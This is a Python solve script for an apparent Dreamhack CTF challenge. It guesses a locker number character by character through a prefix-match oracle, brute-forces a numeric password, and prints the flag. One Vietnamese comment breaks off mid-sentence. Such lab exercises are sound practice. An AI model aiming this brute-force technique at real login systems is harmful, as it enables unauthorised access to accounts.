import re
import requests
import string

host = 'http://host3.dreamhack.games:19674/'
alphanumeric = string.ascii_lowercase + string.digits

# Đoán từng kí tự của rand_str dựa trên tính đúng sai của rand_str[0:len(locker_num)] == locker_num
# Nếu kí tự 

locker_num = ""

for i in range(4):
    for c in alphanumeric:
        payload = locker_num + c
        data = {
            "locker_num": payload,
            "password": 0
        }
        res = requests.post(host, data=data)
        if "Good" in res.text:
            locker_num += c
            break

if locker_num == "":
    print("Failed to guess locker_num")
    exit()

for i in range(100, 201):
    data = {
        "locker_num": locker_num,
        "password": i
    }
    res = requests.post(host, data=data)
    if "FLAG" in res.text:
        print(re.search(r'DH{.*?}', res.text).group())
        break